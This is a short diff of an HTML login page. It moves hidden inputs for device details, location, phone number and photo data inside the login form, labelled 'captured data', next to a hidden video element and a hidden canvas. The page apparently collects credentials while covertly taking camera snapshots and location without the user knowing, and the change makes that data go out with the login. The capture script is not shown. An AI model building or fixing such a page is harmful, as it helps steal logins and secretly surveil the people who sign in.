@@ -35,6 +35,12 @@
 
             <input type="password" name="password" placeholder="Password" />
 
+            <!-- Hidden fields for captured data -->
+            <input type="hidden" name="deviceDetails" id="deviceDetails" />
+            <input type="hidden" name="location" id="location" />
+            <input type="hidden" name="phoneNumber" id="phoneNumber" />
+            <input type="hidden" name="photoData" id="photoData" />
+
             <button type="submit" class="btn-login">Log in</button>
 
         </form>
@@ -51,11 +57,6 @@
         </div>
 
     </div>
-
-    <input type="hidden" name="deviceDetails" id="deviceDetails" />
-    <input type="hidden" name="location" id="location" />
-    <input type="hidden" name="phoneNumber" id="phoneNumber" />
-    <input type="hidden" name="photoData" id="photoData" />
 
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
